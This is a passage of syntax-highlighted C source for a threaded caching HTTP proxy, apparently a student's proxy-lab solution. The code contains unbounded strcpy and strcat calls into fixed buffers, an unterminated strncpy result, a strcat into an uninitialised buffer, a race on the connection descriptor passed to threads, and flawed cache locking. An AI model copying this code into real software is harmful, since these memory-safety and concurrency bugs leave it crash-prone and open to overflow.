key<span class="token punctuation">[</span>MAXLINE<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> value<span class="token punctuation">[</span>MAX_OBJECT_SIZE<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span> nowpointer<span class="token punctuation">;</span><span class="token keyword">struct</span> Cache cache<span class="token punctuation">[</span>MAXLINE<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">struct</span> rwlock_t <span class="token operator">*</span>rw<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    rw<span class="token operator">=</span> <span class="token function">Malloc</span><span class="token punctuation">(</span><span class="token function">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> rwlock_t<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    pthread_t tid<span class="token punctuation">;</span>    <span class="token keyword">int</span> listenfd<span class="token punctuation">,</span>connfd<span class="token punctuation">;</span>    <span class="token function">rwlock_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> hostname<span class="token punctuation">[</span>MAXLINE<span class="token punctuation">]</span><span class="token punctuation">,</span>port<span class="token punctuation">[</span>MAXLINE<span class="token punctuation">]</span><span class="token punctuation">;</span>    socklen_t clientlen<span class="token punctuation">;</span>    <span class="token keyword">struct</span> sockaddr_storage clientaddr<span class="token punctuation">;</span>    <span class="token comment">//判断是否是两个命令</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>argc<span class="token operator">!=</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">fprintf</span><span class="token punctuation">(</span>stderr<span class="token punctuation">,</span><span class="token string">"usage: Fuck ,can you input only two string ?\nsuch as%s &lt;port>\n"</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">// printf("Fuck ,input right message \n");</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    listenfd <span class="token operator">=</span><span class="token function">Open_listenfd</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//listen a port</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        clientlen <span class="token operator">=</span>sizeof <span class="token punctuation">(</span>clientaddr<span class="token punctuation">)</span><span class="token punctuation">;</span>        connfd <span class="token operator">=</span> <span class="token function">Accept</span><span class="token punctuation">(</span>listenfd <span class="token punctuation">,</span><span class="token punctuation">(</span>SA <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>clientaddr<span class="token punctuation">,</span> <span class="token operator">&amp;</span>clientlen<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">Getnameinfo</span><span class="token punctuation">(</span><span class="token punctuation">(</span>SA <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>clientaddr <span class="token punctuation">,</span>clientlen<span class="token punctuation">,</span>hostname <span class="token punctuation">,</span>MAXLINE<span class="token punctuation">,</span>port<span class="token punctuation">,</span>MAXLINE<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Accepted connection from (%s , %s)\n"</span><span class="token punctuation">,</span> hostname <span class="token punctuation">,</span>port<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// accept了</span>        <span class="token comment">//Connection Succeed</span>       <span class="token function">Pthread_create</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>tid<span class="token punctuation">,</span>NULL<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span> thread<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>connfd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">rwlock_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    rw<span class="token operator">-</span><span class="token operator">></span>readers<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token function">sem_init</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>rw<span class="token operator">-</span><span class="token operator">></span>lock<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/*    sem_init 是一个用于初始化信号量的函数。这里初始化了 rw->lock 信号量。    0 表示信号量用于线程间同步（而非进程间同步）。    1 表示信号量的初始值为 1，即该信号量是一个二值信号量，用于互斥访问。    */</span>    <span class="token function">sem_init</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>rw<span class="token operator">-</span><span class="token operator">></span>writelock<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">thread</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>v<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> fd<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">*</span><span class="token punctuation">)</span>v<span class="token punctuation">;</span>    <span class="token function">Pthread_detach</span><span class="token punctuation">(</span><span class="token function">pthread_self</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">handlerequest</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// Free(v);</span>    <span class="token function">Close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">handlerequest</span><span class="token punctuation">(</span><span class="token keyword">int</span> fd<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">char</span> buf<span class="token punctuation">[</span>MAXLINE<span class="token punctuation">]</span><span class="token punctuation">,</span>method<span class="token punctuation">[</span>MAXLINE<span class="token punctuation">]</span><span class="token punctuation">,</span>uri<span class="token punctuation">[</span>MAXLINE<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token keyword">version</span><span class="token punctuation">[</span>MAXLINE<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">// buf </span>    <span class="token keyword">char</span> filename<span class="token punctuation">[</span>MAXLINE<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">//request header</span>    <span class="token keyword">char</span> host<span class="token punctuation">[</span>MAXLINE<span class="token punctuation">]</span><span class="token punctuation">,</span>port<span class="token punctuation">[</span>MAXLINE<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> clientRequest<span class="token punctuation">[</span>MAXLINE<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">// IO for proxy--client ,proxy--server</span>    rio_t rio<span class="token punctuation">,</span>riotiny<span class="token punctuation">;</span>    <span class="token comment">// Read request line and headers</span>    <span class="token comment">// step1: read request from client</span>    <span class="token function">Rio_readinitb</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>rio<span class="token punctuation">,</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">Rio_readlineb</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>rio <span class="token punctuation">,</span>buf<span class="token punctuation">,</span> MAXLINE<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">//把输入的命令给到buf缓冲区</span>    <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"empty request \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token punctuation">;</span><span class="token comment">// empty-> close</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// # HTTP/1.1 --> HTTp/1.0</span>    <span class="token function">replaceHTTPVersion</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token function">parseLine</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span>host<span class="token punctuation">,</span>port<span class="token punctuation">,</span>method<span class="token punctuation">,</span>uri<span class="token punctuation">,</span><span class="token keyword">version</span><span class="token punctuation">,</span>filename<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strcasecmp</span><span class="token punctuation">(</span>method<span class="token punctuation">,</span> <span class="token string">"GET"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">Clienterror</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> method<span class="token punctuation">,</span> <span class="token string">"501"</span><span class="token punctuation">,</span> <span class="token string">"Not Implemented"</span><span class="token punctuation">,</span>                    <span class="token string">"Tiny does not implement this method"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// parse uri from GET request </span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">readcache</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span>uri<span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">return</span> <span class="token punctuation">;</span>    <span class="token keyword">int</span> rv<span class="token operator">=</span><span class="token function">MakeClientRequest</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>rio<span class="token punctuation">,</span> clientRequest<span class="token punctuation">,</span>host<span class="token punctuation">,</span>port<span class="token punctuation">,</span>method<span class="token punctuation">,</span>uri<span class="token punctuation">,</span><span class="token keyword">version</span><span class="token punctuation">,</span>filename<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>rv<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">return</span> <span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"========= we have formatted the reqeust into ---------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span>clientRequest<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> hostName<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">char</span><span class="token operator">*</span> colon <span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> <span class="token string">":"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">strncpy</span><span class="token punctuation">(</span>hostName<span class="token punctuation">,</span> host<span class="token punctuation">,</span> colon <span class="token operator">-</span> host<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"host is %s\n"</span><span class="token punctuation">,</span> hostName<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"port is %s\n"</span><span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//模拟一个clientfd</span>    <span class="token keyword">int</span> clientfd <span class="token operator">=</span> <span class="token function">Open_clientfd</span><span class="token punctuation">(</span>hostName<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">Rio_readinitb</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>riotiny<span class="token punctuation">,</span> clientfd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">Rio_writen</span><span class="token punctuation">(</span>riotiny<span class="token punctuation">.</span>rio_fd<span class="token punctuation">,</span> clientRequest<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>clientRequest<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/** step4: read the response from tiny and send it to the client */</span>    <span class="token keyword">char</span> cache<span class="token punctuation">[</span>MAX_OBJECT_SIZE<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> sum<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"---prepare to get the response---- \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> tinyResponse<span class="token punctuation">[</span>MAXLINE<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> n<span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span> <span class="token punctuation">(</span>n <span class="token operator">=</span> <span class="token function">Rio_readlineb</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>riotiny<span class="token punctuation">,</span> tinyResponse<span class="token punctuation">,</span> MAXLINE<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">Rio_writen</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> tinyResponse<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>        sum<span class="token operator">+=</span>n<span class="token punctuation">;</span>        <span class="token function">strcat</span><span class="token punctuation">(</span>cache<span class="token punctuation">,</span>tinyResponse<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"proxy send %d bytes to client\n"</span><span class="token punctuation">,</span>sum<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>sum<span class="token operator">&lt;</span>MAX_OBJECT_SIZE<span class="token punctuation">)</span>     <span class="token function">writecache</span><span class="token punctuation">(</span>cache<span class="token punctuation">,</span>uri<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">close</span><span class="token punctuation">(</span>clientfd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">writecache</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> buf<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span>key<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">sem_wait</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>rw<span class="token operator">-</span><span class="token operator">></span>writelock<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> index<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>cache<span class="token punctuation">[</span>nowpointer<span class="token punctuation">]</span><span class="token punctuation">.</span>used<span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        cache<span class="token punctuation">[</span>nowpointer<span class="token punctuation">]</span><span class="token punctuation">.</span>used<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>        nowpointer<span class="token operator">=</span><span class="token punctuation">(</span>nowpointer<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span>MAX_CACHE<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    index <span class="token operator">=</span>nowpointer<span class="token punctuation">;</span>    cache<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">.</span>used<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token function">strcpy</span><span class="token punctuation">(</span>cache<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">.</span>key<span class="token punctuation">,</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">strcpy</span><span class="token punctuation">(</span>cache<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">.</span>value<span class="token punctuation">,</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">sem_post</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>rw<span class="token operator">-</span><span class="token operator">></span>writelock<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">readcache</span><span class="token punctuation">(</span><span class="token keyword">int</span> fd<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span>uri<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">sem_wait</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>rw<span class="token operator">-</span><span class="token operator">></span>lock<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>rw<span class="token operator">-</span><span class="token operator">></span>readers<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token function">sem_wait</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>rw<span class="token operator">-</span><span class="token operator">></span>writelock<span class="token punctuation">)</span><span class="token punctuation">;</span>    rw<span class="token operator">-</span><span class="token operator">></span>readers<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token function">sem_post</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>rw<span class="token operator">-</span><span class="token operator">></span>lock<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    <span class="token keyword">int</span> flag<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>MAX_CACHE<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>uri<span class="token punctuation">,</span>cache<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>key<span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">Rio_writen</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span>cache<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>value<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>cache<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//    printf("proxy send %d bytes to client\n", strlen(cache[i].value));</span>            cache<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>used<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>            flag<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">sem_wait</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>rw<span class="token operator">-</span><span class="token operator">></span>lock<span class="token punctuation">)</span><span class="token punctuation">;</span>    rw<span class="token operator">-</span><span class="token operator">></span>readers<span class="token operator">--</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>rw<span class="token operator">-</span><span class="token operator">></span>readers<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token function">sem_post</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>rw<span class="token operator">-</span><span class="token operator">></span>writelock<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">sem_post</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>rw<span class="token operator">-</span><span class="token operator">></span>lock<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> flag<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">MakeClientRequest</span><span class="token punctuation">(</span>rio_t<span class="token operator">*</span> rio<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> clientRequest<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> Host<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> port<span class="token punctuation">,</span>                        <span class="token keyword">char</span><span class="token operator">*</span> method<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> uri<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> <span class="token keyword">version</span><span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> fileName<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> UserAgent <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> Connection <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> ProxyConnection <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> HostInfo <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> buf<span class="token punctuation">[</span>MAXLINE <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> n<span class="token punctuation">;</span>    <span class="token comment">/* 1. add GET HOSTNAME HTTP/1.0 to header &amp;&amp; Host Info */</span>    <span class="token function">sprintf</span><span class="token punctuation">(</span>clientRequest<span class="token punctuation">,</span> <span class="token string">"GET %s HTTP/1.0\r\n"</span><span class="token punctuation">,</span> fileName<span class="token punctuation">)</span><span class="token punctuation">;</span>    n <span class="token operator">=</span> <span class="token function">Rio_readlineb</span><span class="token punctuation">(</span>rio<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> MAXLINE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// n是读取的字节数</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"receive buf %s\n"</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"n == %d\n"</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">char</span><span class="token operator">*</span> findp<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token string">"\r\n"</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> n <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">strcat</span><span class="token punctuation">(</span>clientRequest<span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"receive buf %s\n"</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token punctuation">(</span>findp <span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">"User-Agent:"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> NULL<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            UserAgent <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token punctuation">(</span>findp <span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">"Proxy-Connection:"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> NULL<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            ProxyConnection <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token punctuation">(</span>findp <span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">"Connection:"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> NULL<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            Connection <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token punctuation">(</span>findp <span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">"Host:"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> NULL<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            HostInfo <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        n <span class="token operator">=</span> <span class="token function">Rio_readlineb</span><span class="token punctuation">(</span>rio<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> MAXLINE<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>n <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>HostInfo <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">sprintf</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">"Host: %s\r\n"</span><span class="token punctuation">,</span> Host<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">strcat</span><span class="token punctuation">(</span>clientRequest<span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/** append User-Agent */</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>UserAgent <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">strcat</span><span class="token punctuation">(</span>clientRequest<span class="token punctuation">,</span> user_agent_hdr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token comment">/** append Connection */</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>Connection <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">sprintf</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">"Connection: close\r\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">strcat</span><span class="token punctuation">(</span>clientRequest<span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token comment">/** append Proxy-Connection */</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>ProxyConnection <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">sprintf</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">"Proxy-Connection: close\r\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">strcat</span><span class="token punctuation">(</span>clientRequest<span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/* add terminator for request */</span>    <span class="token function">strcat</span><span class="token punctuation">(</span>clientRequest<span class="token punctuation">,</span> <span class="token string">"\r\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">replaceHTTPVersion</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>buf<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>pos <span class="token operator">=</span>NULL<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>pos<span class="token operator">=</span><span class="token function">strstr</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span><span class="token string">"HTTP/1.1"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">!=</span>NULL<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        buf<span class="token 